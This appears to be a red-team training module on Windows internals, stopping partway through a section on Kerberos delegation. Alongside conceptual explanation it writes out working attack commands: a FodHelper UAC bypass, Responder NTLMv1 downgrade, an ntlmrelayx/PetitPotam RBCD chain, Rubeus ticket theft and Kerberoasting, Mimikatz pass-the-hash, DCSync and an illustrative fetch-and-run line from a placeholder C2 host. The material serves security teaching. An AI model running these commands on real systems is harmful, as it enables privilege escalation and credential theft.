# Phase 00: Windows Internals & Red Team Mindset

> **Why this phase exists**: Every red team technique exploits a Windows design decision.
> If you understand *what* Windows is doing and *why*, attacks stop being "magic commands"
> and start making logical sense. You'll debug failures faster, improvise when tools don't
> work, and understand exactly what the defender can see.
>
> This phase is intentionally complete. Every concept here is a direct prerequisite to at
> least one technique in a later phase. The mastery checklist at the end tells you when
> you're ready to move on — don't skip it.

**Study time**: 2 weeks | **Difficulty**: Beginner

---

## How to Read This Phase

Each section follows the same pattern:

```
What is it?       → One clear definition
Why does it exist → The real-world problem it solves
Why it matters    → How it connects to attacks
Mental model      → An analogy or diagram to make it stick
```

Read every section in order. They build on each other.

---

## Table of Contents

1. [The Two Zones: Kernel Mode vs User Mode](#1-the-two-zones-kernel-mode-vs-user-mode)
2. [Processes, Threads, and Handles](#2-processes-threads-and-handles)
3. [DLLs and the DLL Search Order](#3-dlls-and-the-dll-search-order)
4. [SIDs — The Real Identity in Windows](#4-sids--the-real-identity-in-windows)
5. [Access Tokens — The Heart of Windows Security](#5-access-tokens--the-heart-of-windows-security)
6. [Integrity Levels and UAC](#6-integrity-levels-and-uac)
7. [AMSI and the Detection Architecture](#7-amsi-and-the-detection-architecture)
8. [COM — The Invisible Glue](#8-com--the-invisible-glue)
9. [Named Pipes and IPC](#9-named-pipes-and-ipc)
10. [NTLM — Windows' Fallback Auth Protocol](#10-ntlm--windows-fallback-auth-protocol)
11. [Kerberos — The Domain Auth Protocol](#11-kerberos--the-domain-auth-protocol)
12. [Kerberos Delegation](#12-kerberos-delegation)
13. [AD Object ACLs and BloodHound Paths](#13-ad-object-acls-and-bloodhound-paths)
14. [ADCS — Active Directory Certificate Services](#14-adcs--active-directory-certificate-services)
15. [The Windows Registry](#15-the-windows-registry)
16. [Windows Services](#16-windows-services)
17. [Scheduled Tasks](#17-scheduled-tasks)
18. [WMI — Windows Management Instrumentation](#18-wmi--windows-management-instrumentation)
19. [LSASS, SAM, and NTDS.dit](#19-lsass-sam-and-ntdsdit)
20. [Event Logs — What You Leave Behind](#20-event-logs--what-you-leave-behind)
21. [The Red Team Mindset](#21-the-red-team-mindset)
22. [Build Your Lab](#22-build-your-lab)
23. [Free Learning Resources](#23-free-learning-resources)
24. [Phase 00 Mastery Checklist](#24-phase-00-mastery-checklist)

---

## 1. The Two Zones: Kernel Mode vs User Mode

### What it is

Windows is divided into two clearly separated zones:

```
┌─────────────────────────────────────────────────┐
│                  USER MODE                      │
│                                                 │
│  notepad.exe   lsass.exe   chrome.exe   C2.exe  │
│  (your apps)  (auth svc)  (browser)   (beacon)  │
│                                                 │
│  Each process gets its OWN isolated memory.     │
│  Process A cannot read process B's memory       │
│  without explicit OS permission.                │
├─────────────────────────────────────────────────┤
│                 KERNEL MODE                     │
│                                                 │
│  Windows OS core, hardware drivers, memory mgr  │
│  Unrestricted access to ALL memory and hardware │
│  A crash here = Blue Screen of Death (BSOD)     │
└─────────────────────────────────────────────────┘
```

### Why it exists

Without separation, any program could read or overwrite anything — your banking app could peek into your password manager's memory. Isolation is the OS's core security promise.

### Why it matters for red teaming

LSASS (which holds credentials) runs in **user mode** — meaning you *can* access it, but only if the OS grants permission. The entire game of privilege escalation is: "How do I get the OS to grant permissions it wasn't supposed to?"

PPL (explained in Section 19) pushes LSASS closer to kernel-mode protections. Kernel drivers — either Microsoft's or brought-your-own-vulnerable ones — are needed to defeat it.

> **Mental model**: The kernel is the hotel manager with a master key. User-mode processes are guests with room keys. You can only enter rooms you have a key for — unless you steal the manager's key.

---

## 2. Processes, Threads, and Handles

### What they are

**Process**: A running program. Each process has its own private memory space, a security identity (token), and one or more threads.

**Thread**: The actual unit of execution inside a process. A process can have many threads running simultaneously.

**Handle**: A reference to a Windows object (file, process, registry key, mutex). It's a numbered ticket the OS gives you when you open an object, granting only the access rights you requested at open time.

```
Your beacon process
  │
  ├── Token: "I am CORP\jdoe, Medium Integrity, no SeDebugPrivilege"
  │
  ├── Handles:
  │     Handle #4  → C:\Windows\Temp\log.txt  (READ access)
  │     Handle #8  → lsass.exe process        (would need PROCESS_VM_READ)
  │     Handle #12 → HKCU\Software\...        (READ/WRITE access)
  │
  └── Threads: Thread 1 (beacon loop), Thread 2 (C2 comms)
```

### Why handles matter

When Mimikatz dumps LSASS, it calls `OpenProcess(lsass_pid, PROCESS_VM_READ)`. Windows checks your token for `SeDebugPrivilege`. If present → returns a valid handle. If not → Access Denied.

**EDRs watch `OpenProcess` calls on LSASS specifically** — the handle request is the earliest observable signal of a credential dump attempt. This is why modern dump techniques avoid `OpenProcess` entirely (process snapshots, handle duplication from other processes, kernel callbacks).

> **Mental model**: A handle is a valet ticket. You hand your car key (the real object) to the OS. The OS gives you a numbered stub (the handle). When you want your car back, you present the stub — but only if you parked with the right access level.

---

## 3. DLLs and the DLL Search Order

### What a DLL is

A **DLL (Dynamic Link Library)** is a file of compiled code that multiple programs share. Instead of every application shipping its own crypto functions or UI widgets, they load one shared DLL.

```
notepad.exe
  └── loads → user32.dll   (UI: CreateWindow, MessageBox...)
  └── loads → kernel32.dll (Core: CreateFile, CreateProcess...)
  └── loads → ntdll.dll    (Low-level NT functions, closest to kernel)
```

### The DLL search order

When a program calls `LoadLibrary("example.dll")`, Windows searches in this order:

```
1. KnownDLLs (registry — loaded before searching disk, see below)
2. The application's own directory     (e.g., C:\Program Files\App\)
3. C:\Windows\System32\
4. C:\Windows\System\
5. C:\Windows\
6. Current working directory
7. Directories listed in %PATH%
```

### KnownDLLs — the most important exception

```
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
```

DLLs listed here (`kernel32.dll`, `ntdll.dll`, `user32.dll`, etc.) are **never** loaded from disk. Windows maps them from pre-created kernel section objects at boot time. You cannot DLL-hijack them from user space — Windows never even looks on disk for them.

**Practical implication**: Attackers target non-KnownDLL dependencies — optional or application-specific DLLs that the app tries to load but that don't exist in System32. Examples: `cryptbase.dll`, `wlbsctrl.dll`, `version.dll` (loaded by many apps, not in KnownDLLs). Beginners often try to hijack `kernel32.dll` and wonder why nothing happens.

### Why the search order creates a privilege escalation surface

If an application tries to load a DLL that **doesn't exist** in the expected location, Windows walks down the list. If you can write a file to a directory that appears *before* where the real DLL would be:

```
VulnApp.exe (runs as SYSTEM) tries to load: missing_module.dll
  → KnownDLLs?     Not there
  → C:\Program Files\VulnApp\   ← writable by Users? DROP YOUR DLL HERE
  → C:\Windows\System32\        ← real DLL isn't here either (it's missing)
  → ...
```

Your DLL gets loaded in the context of the application — as SYSTEM.

> **Mental model**: DLL hijacking is putting a counterfeit book on a library shelf the librarian checks before the real one. She picks up your fake and reads it. KnownDLLs are books kept behind the counter — she never even walks to the shelves for those.

---

## 4. SIDs — The Real Identity in Windows

### What a SID is

A **Security Identifier (SID)** is a unique, immutable identifier for every user, group, and computer. Windows does **not** use usernames in access checks — it uses SIDs.

```
Full domain SID:
S-1-5-21-1234567890-9876543210-1122334455-1001

  S          → "this is a SID"
  1          → revision (always 1)
  5          → identifier authority (5 = NT Authority)
  21         → sub-authority pattern indicating a domain/machine account
  1234567890-9876543210-1122334455 → domain identifier (unique per domain)
  1001       → RID (Relative Identifier) — account's number within the domain
```

### Well-known RIDs you must memorise

| RID | Meaning |
|-----|---------|
| 500 | Built-in Administrator account |
| 501 | Built-in Guest account |
| 512 | Domain Admins group |
| 513 | Domain Users group |
| 516 | Domain Controllers group |
| 519 | Enterprise Admins group |
| 520 | Group Policy Creator Owners |

### Well-known fixed SIDs (no domain component)

| SID | Meaning |
|-----|---------|
| S-1-5-18 | SYSTEM (the OS itself) |
| S-1-5-19 | Local Service |
| S-1-5-20 | Network Service |
| S-1-5-32-544 | Built-in Administrators group |
| S-1-1-0 | Everyone |

### Why SIDs matter for attacks

When you forge a Golden Ticket, you embed SIDs into the PAC (authorization data inside the ticket). The DC validates the ticket's cryptographic signature — but trusts the PAC contents to be accurate. Put SID `S-1-5-21-[domain]-512` in your forged PAC → you become Domain Admin. The username is almost irrelevant; the SIDs are what every access check uses.

> **Mental model**: SIDs are Social Security Numbers. Your name can change; your SSN doesn't. Windows never checks your name — only your number.

---

## 5. Access Tokens — The Heart of Windows Security

### What an access token is

Every process carries an **access token** — the answer to "who are you and what are you allowed to do?"

A token contains:
- Your SID (who you are)
- The SIDs of every group you belong to
- Your privileges (SeDebugPrivilege, SeImpersonatePrivilege, etc.)
- Your integrity level (Section 6)
- Logon session identifier

When you try to open any object, Windows extracts your token and compares it against the object's DACL. Match → allowed. No match → denied.

### Token types

**Primary token**: The main identity of a process. Set when the process starts. Child processes inherit it.

**Impersonation token**: A temporary token a *thread* uses to act as a different user. Services use this when handling client requests. A thread can hold an impersonation token completely different from its process's primary token.

### Token impersonation levels

This is one of the most skipped details — and it determines what you can actually *do* with a stolen token.

| Level | What the server can do |
|-------|----------------------|
| `SecurityAnonymous` | Nothing — server doesn't even know who you are |
| `SecurityIdentification` | Server can identify you but **cannot** impersonate you |
| `SecurityImpersonation` | Server can impersonate you on the **local system only** |
| `SecurityDelegation` | Server can impersonate you on **remote systems** (requires Kerberos) |

**Why this matters for Potato attacks and lateral movement**:

When you steal a token from a named pipe (Potato attack), the token typically arrives at `SecurityImpersonation` level. This is sufficient to:
- `CreateProcessWithToken()` → local SYSTEM shell ✓
- Access local files as SYSTEM ✓

But it is **not** sufficient to:
- Authenticate to a remote machine as that user ✗
- Kerberos SSO to network resources ✗

`SecurityDelegation` tokens only appear when the service account has Kerberos delegation configured — which is exactly why unconstrained delegation (Section 12) is so powerful: it gives you delegation-level TGTs.

### Key privileges

| Privilege | What it grants | Attack use |
|-----------|---------------|------------|
| `SeDebugPrivilege` | Open any process for read/write | Dump LSASS memory |
| `SeImpersonatePrivilege` | Use impersonation tokens from clients | Potato attacks → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Replace a process's primary token | Alternative SYSTEM path |
| `SeLoadDriverPrivilege` | Load/unload kernel drivers | Bypass PPL, install rootkit |
| `SeTakeOwnershipPrivilege` | Take ownership of any object | Override file ACLs |
| `SeRestorePrivilege` | Write to objects ignoring ACLs | Registry/file manipulation |
| `SeBackupPrivilege` | Read any file ignoring ACLs | SAM/SYSTEM backup without admin |

### Why SeImpersonatePrivilege leads to SYSTEM

This privilege says: "this process may use impersonation tokens provided by authenticating clients."

Granted by default to: IIS (`w3wp.exe`), MSSQL (`sqlservr.exe`), accounts running as Network Service or Local Service.

```
Compromise web app → running as IIS (w3wp.exe)
IIS has SeImpersonatePrivilege by design
↓
Potato attack: coerce SYSTEM to authenticate to your named pipe
Windows gives you a SYSTEM impersonation token
SeImpersonatePrivilege lets you USE that token
↓
CreateProcessWithToken(system_token) → SYSTEM shell
```

> **Practice now**: `whoami /priv` on a Windows machine. Note Enabled vs Disabled. Disabled ≠ absent — many privileges can be re-enabled programmatically within the same session.

---

## 6. Integrity Levels and UAC

### What Mandatory Integrity Control (MIC) is

Windows has a second access control system layered on top of ACLs: every process and object has an **integrity level**.

```
Levels (lowest to highest):
  Untrusted   → Browser sandbox, isolated content
  Low         → Internet Explorer protected mode
  Medium      → Normal user processes, even if user is a local admin
  High        → Elevated processes ("Run as administrator")
  System      → SYSTEM-level processes, most Windows services
  Protected   → PPL-protected processes (Section 19)
```

A process can write only to objects at its own level or below. Writing upward is blocked.

### What UAC actually is

**UAC is not a security boundary.** Microsoft says so explicitly in their documentation. It is a convenience feature to prevent accidental admin operations.

The core mechanism:
```
You log in as a local admin.
Windows creates two tokens for your session:
  1. Filtered token (Medium integrity) → used for all your normal processes
  2. Full admin token (High integrity)  → held in reserve until you elevate

notepad.exe         → filtered token (Medium)
"Run as admin" cmd  → UAC prompt → full admin token (High)
```

**Why this matters for attacks**: When your beacon lands on a local admin account at Medium integrity, you cannot write to HKLM, modify system files, or access most privileged operations — even though `whoami /groups` shows `BUILTIN\Administrators`.

Checking your integrity level:
```
whoami /groups | findstr "Label"

Mandatory Label\Medium Mandatory Level  → not elevated, must bypass UAC
Mandatory Label\High Mandatory Level    → elevated, proceed
Mandatory Label\System Mandatory Level  → SYSTEM, maximum access
```

### UAC bypass: why FodHelper works

`fodhelper.exe` is marked **auto-elevate** — it can reach High integrity without a UAC prompt, because Windows trusts it as a Microsoft binary. Before launching, it reads:
```
HKCU\Software\Classes\ms-settings\shell\open\command
```
That key is writable by any user. You write your payload path there:
```
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /f
start fodhelper.exe
# cmd.exe opens at High integrity — no UAC prompt
```

Why it works: `fodhelper.exe` is trusted to auto-elevate (no prompt) and reads a user-controlled registry key before launching. You control what it runs. The auto-elevation is the bypass.

**Other UAC bypass methods**:
- `eventvwr.exe`: Same concept — reads `HKCU\Software\Classes\mscfile\shell\open\command`
- `cmstp.exe`: Abuses COM script processing auto-elevation
- **Mock Trusted Directories**: `C:\Windows \System32\` (note trailing space) — tricks COM elevation checks
- **DiskCleanup scheduled task**: Runs as High integrity on a schedule, environment variable hijack

> **Mental model**: UAC is a locked door that only opens when you ask nicely (the prompt). UAC bypass finds a trusted staff member (auto-elevate binary) who opens the door without asking — and tricks them into carrying your package through.

---

## 7. AMSI and the Detection Architecture

### Why you need to know this in Phase 00

You will be generating shells, running PowerShell, and executing .NET tools. You need to understand what is watching before your first command runs — not discover it when your tool gets killed.

### AMSI (Antimalware Scan Interface)

**AMSI** is a Windows interface that allows security products (Defender, CrowdStrike, etc.) to scan content **before it executes** — including content that never touches disk.

AMSI is injected into:
- PowerShell (every script block, every command)
- VBScript / JScript
- .NET Assembly.Load()
- WMI script execution
- Office macro execution

```
You type in PowerShell:
  PS> IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')

Before the content runs:
  PowerShell passes the downloaded string to AMSI
  AMSI passes it to the installed security product
  If flagged → "This script contains malicious content" error
  Your payload never executes
```

**Key insight**: AMSI operates on the *content in memory*, not the file on disk. Traditional AV evasion (encoding a file) does not bypass AMSI. The content is decoded in memory before AMSI scans it.

### The classic AMSI bypass

The `AmsiScanBuffer` function in `amsi.dll` is loaded into every PowerShell process. If you patch it to always return "clean" (`AMSI_RESULT_CLEAN = 1`), AMSI stops scanning.

```powershell
# Conceptual — real bypass code is obfuscated to avoid detection of the bypass itself:
# Find AmsiScanBuffer in memory
# Overwrite the first bytes with: xor eax,eax; ret  (always return 0 = clean)
# Now everything you run in this PowerShell session is unscanned
```

**Important**: The bypass code itself is detected by AMSI before it can run. This is why bypass code is always obfuscated. You're fighting a meta-problem: bypass code that gets blocked by the thing it's trying to bypass.

Full bypass techniques are in Phase 04. Here you just need to understand the architecture.

### ETW (Event Tracing for Windows)

**ETW** is the logging backbone of Windows. It's not just Sysmon events — ETW providers are embedded in the kernel and in every major subsystem. EDRs subscribe directly to ETW kernel providers and receive telemetry before any log is written to disk.

What EDRs see via ETW:
- Process creation with parent PID and full command line
- Memory allocation patterns (VirtualAlloc, WriteProcessMemory)
- Image loading (which DLLs were loaded into which process)
- Network connections at the socket level
- .NET runtime events (which assemblies were loaded)

### How EDRs intercept your tools: usermode hooks

Modern EDRs inject a DLL into every process. That DLL patches the first bytes of sensitive functions in `ntdll.dll` (Windows' lowest-level user-mode library) to redirect execution through the EDR's own analysis code before the real syscall fires.

```
Your beacon calls: CreateRemoteThread(target_process, ...)

Without EDR:
  CreateRemoteThread → ntdll.NtCreateThreadEx → kernel syscall → done

With EDR hooks:
  CreateRemoteThread → [EDR trampoline] → EDR analysis code
                      → maybe allow → ntdll.NtCreateThreadEx → kernel
                      → maybe block → access denied / process killed
```

**Why this matters**: This is why tools like Cobalt Strike's `execute-assembly` (run .NET in memory), direct syscalls (bypass ntdll hooks by calling the kernel directly), and indirect syscalls exist. Understanding that the hook lives in ntdll in user space is what makes those evasion techniques logical rather than magic.

For now: know the architecture. Phase 04 covers the bypasses.

---

## 8. COM — The Invisible Glue

### What COM is

**COM (Component Object Model)** is a Windows framework that lets software components expose functionality to other programs — regardless of language or process boundary. Every COM component has a **CLSID** (Class Identifier), a GUID registered in the registry.

```
HKLM\SOFTWARE\Classes\CLSID\{GUID}\LocalServer32  → path to .exe (out-of-process)
HKLM\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32 → path to .dll (in-process)
```

When code calls `CoCreateInstance({GUID})`, Windows looks up the GUID, finds the binary path, and loads it.

### Why COM matters for red teaming

**1. COM hijacking**: HKLM COM registrations require admin rights to modify. But Windows checks HKCU *before* HKLM. If you register your malicious DLL under a CLSID in HKCU:

```
HKCU\SOFTWARE\Classes\CLSID\{target-guid}\InprocServer32 = C:\temp\evil.dll
→ Your DLL loads in the context of whatever app instantiates this object
→ No admin rights needed — HKCU is user-writable
```

**2. UAC auto-elevation via COM**: Some COM objects are marked for auto-elevation — they can elevate without a UAC prompt. FodHelper's bypass works because it invokes one of these COM objects. Understanding COM explains *why* UAC bypasses work instead of just how.

**3. Potato attack coercion**: GodPotato and SweetPotato coerce SYSTEM to authenticate by abusing COM activation paths (EfsRpc, DCOM). The SYSTEM token arrives as part of the COM/RPC authentication handshake.

**4. DCOM lateral movement**: Distributed COM (DCOM) allows invoking COM objects on remote machines. With valid credentials, you can execute code on a remote host via DCOM — used in tools like `dcomexec.py` from Impacket.

> **Mental model**: COM is a restaurant intercom. A waiter (your process) calls an extension number (CLSID) to reach a kitchen station (another component). COM hijacking is reprogramming the intercom so that extension redirects to your phone — and the kitchen sends the food to you instead.

---

## 9. Named Pipes and IPC

### What inter-process communication is

Processes are isolated — they can't directly read each other's memory. **IPC (Inter-Process Communication)** mechanisms let them communicate. The most important for red teaming is **named pipes**.

### What a named pipe is

A named pipe is a communication channel with an address: `\\.\pipe\pipename`. It works like a bidirectional file — one side writes, the other reads. Services use named pipes constantly. SMB exposes them over the network.

```
Process A (server)          Process B (client)
Creates: \\.\pipe\myservice
Waits for connection    ←→  Connects to \\.\pipe\myservice
Reads requests              Writes requests
Writes responses            Reads responses
```

### Why named pipes are central to Potato attacks

When a client authenticates over a named pipe, the server receives an **impersonation token** for that client — the OS's way of letting the server act on the client's behalf. This is legitimate Windows design.

Potato attacks weaponise it:
```
Step 1: You (running as IIS/MSSQL service account) create a named pipe server
        \\.\pipe\fake_service

Step 2: You coerce a SYSTEM-level process to connect and authenticate
        (different Potato variants use different coercion paths)

Step 3: ImpersonateNamedPipeClient() → OS hands you a SYSTEM impersonation token

Step 4: Your process has SeImpersonatePrivilege
        CreateProcessWithToken(system_token) → SYSTEM shell
```

Each Potato variant (GodPotato, SweetPotato, PrintSpoofer) differs only in **how it coerces SYSTEM to connect**. The pipe and impersonation mechanism is identical in all of them.

**GodPotato specifically** coerces SYSTEM via the EfsRpc COM interface (Section 8). It's called "God" because it works on Server 2012 through 2022 and Windows 10/11 with no version dependencies.

> **Mental model**: Named pipes are a drive-through window with an address. Potato attacks are opening a fake restaurant at that same address — when the supply truck (SYSTEM) pulls up, you steal the delivery.

---

## 10. NTLM — Windows' Fallback Auth Protocol

### What NTLM is

**NTLM** is a challenge-response authentication protocol used when Kerberos isn't available — connecting by IP address instead of hostname, non-domain machines, or Kerberos fallback.

### The three-step handshake

```
Client                              Server
  │                                   │
  ├──── NEGOTIATE_MESSAGE ────────────►│  "I want to auth as Alice"
  │◄─── CHALLENGE_MESSAGE ────────────┤  "Here's an 8-byte random nonce"
  ├──── AUTHENTICATE_MESSAGE ─────────►│  "Here's my response"
```

The response (NTLMv2):
```
Response = HMAC-MD5(NT_hash, challenge + client_nonce + timestamp + target_info)
```

### NTLMv1 — the downgrade path

NTLMv1 uses DES with a static challenge and is crackable instantly with precomputed tables. Responder can be configured to downgrade authentication to NTLMv1. If the client accepts the downgrade, the captured hash can be cracked at [crack.sh](https://crack.sh) in seconds — for free.

```
# Responder with NTLMv1 downgrade:
responder -I eth0 --lm --disable-ess
# Captured NTLMv1 hashes → crack.sh within seconds
```

Check if NTLMv1 is allowed: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LmCompatibilityLevel` should be 5 (NTLMv2 only). Values below 5 accept NTLMv1 downgrades.

### NT hash vs NetNTLMv2 — the critical distinction

This is the most commonly confused concept in credential access. They are not interchangeable.

| | NT Hash | NetNTLMv2 |
|---|---|---|
| **What it is** | MD4 hash of the password | A challenge-response computed using the NT hash |
| **Where it lives** | SAM database, LSASS memory | Only during an NTLM authentication exchange |
| **Pass-the-Hash?** | **Yes** — directly replay over SMB, WMI, etc. | **No** — tied to a specific challenge, cannot replay |
| **How to get it** | Dump LSASS or SAM | Capture with Responder or relay interception |
| **Format** | `aad3b435b51404ee:32ed87bdb5fdc5e9...` | `Alice::DOMAIN:challenge:response:blob` |

**Why PtH works**: The NT hash is exactly what the client uses to compute the NTLM response. If you have the hash, you compute the correct response without knowing the plaintext. Impacket's `psexec.py -hashes` does this at the protocol level.

**Why you can't replay NetNTLMv2**: The response is bound to a one-time server challenge. Every session generates a different challenge. You can't reuse the response — you have to crack it to get the underlying NT hash or plaintext.

### NTLM relay — how it actually starts (coercion)

The relay section of most guides explains the relay itself but skips how you trigger NTLM authentication from a machine you don't control. That trigger is **coercion**.

**Coercion primitives — ways to force a machine to authenticate to you**:

| Technique | Protocol abused | Notes |
|-----------|----------------|-------|
| **PrinterBug / SpoolSample** | MS-RPRN (Print Spooler) | Works pre-Server 2022, requires Print Spooler running |
| **PetitPotam** | MS-EFSR (EFS RPC) | Works without credentials on unpatched targets |
| **DFSCoerce** | MS-DFSNM (DFS) | Alternative to PetitPotam |
| **ShadowCoerce** | MS-FSRVP (Volume Shadow Copy) | Newer variant |

**The full coercion → relay → RBCD chain**:
```
Step 1: Set up ntlmrelayx on your attacker machine
        ntlmrelayx.py -t ldap://dc.corp.local --delegate-access

Step 2: Coerce the target machine to authenticate to you
        PetitPotam.py your-ip target-ip
        # Target machine sends NTLM auth to you

Step 3: ntlmrelayx relays the auth to LDAP on the DC
        (Machine accounts can write their own msDS-AllowedToActOnBehalfOfOtherIdentity)

Step 4: ntlmrelayx creates a new computer account and writes it into
        the target machine's RBCD attribute (more on RBCD in Section 12)

Step 5: Use S4U2Self + S4U2Proxy to impersonate a DA to the target machine
        getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/newcomputer$:pass
        → Full SYSTEM on target via Kerberos — no password cracked
```

This chain — coercion → relay → RBCD → SYSTEM — is one of the most common paths in modern engagements.

> **Mental model**: Coercion is kicking over someone's chess board so they instinctively reach for their king to protect it — that instinctive reach (NTLM auth) is what you intercept.

---

## 11. Kerberos — The Domain Auth Protocol

### Why Kerberos exists

NTLM requires the server to call the DC to validate every authentication. This doesn't scale. Kerberos solves this by giving users a **ticket** — a cryptographic token they present to services, which the service validates itself without touching the DC.

### The three actors

- **Client**: The user's machine
- **KDC (Key Distribution Center)**: Runs on the Domain Controller
- **Service**: The resource the user wants to access

### The full authentication flow

```
┌─────────────────────────────────────────────────────────────────────┐
│ Step 1: AS-REQ (Authentication Service Request)                     │
│                                                                     │
│ Client → KDC: "I'm Alice, give me a TGT"                            │
│   Includes timestamp encrypted with Alice's NT hash (pre-auth)      │
│   Pre-auth proves Alice knows her password without sending it        │
│                                                                     │
│ KDC → Client: AS-REP                                                │
│   Contains a TGT encrypted with the krbtgt account's hash           │
│   Alice holds the TGT but cannot read it — it's opaque to her       │
│   Also contains a session key, encrypted with Alice's NT hash        │
├─────────────────────────────────────────────────────────────────────┤
│ Step 2: TGS-REQ (Ticket Granting Service Request)                   │
│                                                                     │
│ Client → KDC: "I want to access CIFS/FS01, here's my TGT"           │
│   KDC decrypts TGT with krbtgt key → validates Alice's identity      │
│   KDC issues a Service Ticket for CIFS/FS01                         │
│   Encrypted with FS01's computer account hash                       │
│   Contains the PAC (see below)                                      │
├─────────────────────────────────────────────────────────────────────┤
│ Step 3: AP-REQ (Application Request)                                │
│                                                                     │
│ Client → FS01: "Here's my service ticket"                           │
│   FS01 decrypts ticket with its own hash → extracts the PAC         │
│   FS01 checks Alice's SIDs in the PAC against the file's ACL        │
│   → Access granted or denied                                        │
└─────────────────────────────────────────────────────────────────────┘
```

### The PAC — what's inside the ticket and why it matters

The **PAC (Privilege Attribute Certificate)** is a Microsoft-specific data structure embedded in Kerberos tickets. It contains:
- The user's SID
- The SIDs of all their group memberships
- Logon time, password expiry, account flags

The PAC is **signed by the KDC** using the krbtgt hash. Services validate the signature to verify the PAC wasn't tampered with.

**How the Golden Ticket actually works**:

The KDC doesn't trust the PAC blindly — it validates the signature. But when you perform a DCSync and steal the krbtgt hash, you possess the exact key the KDC uses to sign PACs. You forge a PAC with whatever SIDs you want and sign it correctly with the stolen krbtgt key. The KDC validates your signature — it passes, because you signed it with the real key. That's the attack: not that the KDC ignores signatures, but that you can produce a valid signature.

### Kerberos attacks mapped to protocol steps

| Attack | Step exploited | What you need |
|--------|---------------|---------------|
| **AS-REP Roasting** | Step 1: skip pre-auth | Nothing — any domain user can try all accounts |
| **Kerberoasting** | Step 2: any user can request TGS | Any domain user account |
| **Pass-the-Ticket** | Steps 2&3: inject a stolen ticket | Stolen TGT or service ticket from LSASS |
| **Overpass-the-Hash** | Step 1: NT hash → TGT | NT hash from LSASS |
| **Golden Ticket** | Forges step 1's output | krbtgt hash (DCSync) |
| **Silver Ticket** | Forges step 3's ticket | Service account hash |

### Silver Tickets — the stealthy alternative to Golden

A **Silver Ticket** is a forged service ticket (TGS) using the **service account's hash** — not krbtgt.

```
You compromise svc_sql account → have its NT hash
Forge a service ticket for MSSQLSvc/db01.corp.local → embed Administrator SID in PAC
Sign it with svc_sql's hash → DB01 accepts it as valid

Result: access to that SQL service as any identity you choose
        No KDC is contacted. Ever. No event 4768 or 4769 generated.
```

**Key differences from Golden Ticket**:

| | Golden Ticket | Silver Ticket |
|---|---|---|
| Key needed | krbtgt hash | Service account hash |
| Scope | Domain-wide (any service) | One specific SPN only |
| KDC contacted? | No (you forge the TGT) | No (you forge the TGS) |
| Detectable? | 4769 anomalies possible | **Never detected at KDC level** |
| Use case | Full domain access | Targeted service access, stealth |

Target these SPNs for maximum impact:
- `CIFS/target` → full SMB file access
- `HOST/target` → WMI and scheduled task execution
- `HTTP/target` → web app access
- `MSSQLSvc/target:1433` → database access

### Pass-the-Ticket mechanics

Kerberos tickets live in LSASS memory inside the Kerberos SSP credential cache.

```
# Enumerate all tickets in current session:
Rubeus.exe triage

# Dump a specific ticket by LUID:
Rubeus.exe dump /luid:0x3e4 /nowrap

# Inject a ticket into your current session:
Rubeus.exe ptt /ticket:base64encodedticket==

# Better OPSEC — inject into an isolated logon session:
Rubeus.exe createnetonly /program:cmd.exe /domain:corp.local /username:fake /password:fake
# Note the LUID printed
Rubeus.exe ptt /ticket:... /luid:0x<new_luid>
# Use that spawned process — your current session is untouched
```

`createnetonly` is the key OPSEC improvement — it creates a new logon session (a "sacrificial" session) for your stolen ticket. Your existing session's tickets are not modified, meaning Sysmon event correlation is harder.

### Overpass-the-Hash

**Why it matters**: Pass-the-Hash uses NTLM. If the environment monitors for NTLM authentication or if NTLM is blocked to certain targets, you're stuck. Overpass-the-Hash converts an NT hash into a Kerberos TGT — you generate clean Kerberos traffic instead.

```
# With Rubeus:
Rubeus.exe asktgt /user:jdoe /ntlm:32ed87bdb5fdc5e9... /domain:corp.local /ptt
# Now your session has a real TGT for jdoe, obtained via NTLM hash
# All subsequent auth is Kerberos — no NTLM trace

# Or with Mimikatz:
sekurlsa::pth /user:jdoe /domain:corp.local /ntlm:32ed87bdb5... /run:cmd.exe
```

### SPNs — why Kerberoasting needs no special privileges

A **Service Principal Name (SPN)** maps a service to the account running it. `MSSQLSvc/db01.corp.local:1433` is registered on `svc_sql`. Any authenticated domain user can request a service ticket for any SPN. The ticket comes back encrypted with `svc_sql`'s hash. Take it offline and crack it.

```
# Kerberoasting with Rubeus:
Rubeus.exe kerberoast /outputfile:hashes.txt

# Offline crack:
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# Why service accounts crack easily:
# - Passwords set by humans (memorable)
# - PasswordNeverExpires = true (never rotated)
# - Set once, forgotten for years
```

> **Mental model**: A TGT is your passport. A service ticket is a visa for one specific country. The PAC is the pages listing your citizenship. A Golden Ticket is a counterfeit passport stamped with the real immigration seal. A Silver Ticket is a counterfeit visa — forged using the destination country's own stamp, not the immigration office's.

---

## 12. Kerberos Delegation

### Why delegation exists

A web app needs to connect to a database on behalf of the logged-in user — not as the web app's own service account. Delegation lets the web server impersonate the user to the database. This is a legitimate architectural need; the attacks are consequences of misconfiguration and overly broad permission grants.

Three delegation types exist, each with a distinct attack path.

---

### Unconstrained Delegation

**What it is**: A machine or service account with the `TrustedForDelegation` flag set in AD (`userAccountControl` attribute). When any user authenticates to this machine via Kerberos, a copy of their full TGT is stored in LSASS on that machine.

```
User authenticates to WEB01 (has unconstrained delegation)
→ User's TGT is forwarded to WEB01 and cached in LSASS
→ WEB01 can now authenticate anywhere in the domain as that user
```

**Why it's dangerous**: Any user who authenticates to that machine leaves their TGT behind. Including Domain Controllers running replication.

**The coercion exploit path**:
```
Step 1: You compromise WEB01 (unconstrained delegation)
Step 2: Set up monitoring: Rubeus.exe monitor /interval:5 /nowrap
Step 3: Coerce DC01 to authenticate to WEB01:
        SpoolSample.exe DC01 WEB01  (PrinterBug)
        — or —
        PetitPotam.py WEB01 DC01    (EfsRpc)
Step 4: DC01's machine account TGT arrives in Rubeus output
Step 5: Inject the DC TGT: Rubeus.exe ptt /ticket:...
Step 6: DCSync from this session → krbtgt hash → Golden Ticket
        secretsdump.py -k -no-pass DC01.corp.local
```

**Enumerate unconstrained delegation targets**:
```
# PowerView:
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname
# or AD module:
